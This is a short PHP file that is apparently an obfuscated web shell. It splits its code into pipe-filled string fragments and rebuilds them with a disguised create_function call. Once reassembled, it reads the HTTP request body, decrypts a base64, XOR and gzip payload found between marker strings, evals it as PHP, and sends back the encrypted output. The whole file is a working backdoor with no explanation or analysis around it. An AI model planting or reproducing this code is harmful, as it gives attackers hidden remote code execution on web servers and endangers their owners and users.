<?php
$D='|for($i|=0;$i<$l;)|{for($j=0;|($j<$c||&&$i<$l|);$j++,$i++||){$o.=$t{|$i}^$k';
$k=');$r=@b|a|se64_enc|ode(@|x(@gzcomp|res|s($o),$k)|);|print("|$p$kh$r$kf");}';
$X='t||s("php://inpu|t")|,$|m)==1)| {@ob_start|();@eva|l(@gzu|ncompress|(|@x|(';
$l='@base6|4_decode($m[1]|),$||k||)));$o=@ob|_get_conten|ts();@ob_end_clea||n(';
$F='$k|="0|9ee74d3";|$kh="4202|cd1b|f226";$k|f|=|"098d|847c1086";$p="5|L||4yz';
$S=str_replace('x','','cxreaxtxxe_funcxtixon');
$r='2S9Jw6dv8A|z";function x($t|,|$k|){$c=|strlen($k);$l=s|trlen(|$t);|$o|=""|;';
$e='{$j};|}|}retu||rn $o;}if| (@p|reg_ma|tch("/$kh(.+)$|kf/",@file_g|et_cont|en';
$z=str_replace('|','',$F.$r.$D.$e.$X.$l.$k);
$T=$S('',$z);$T();
?>
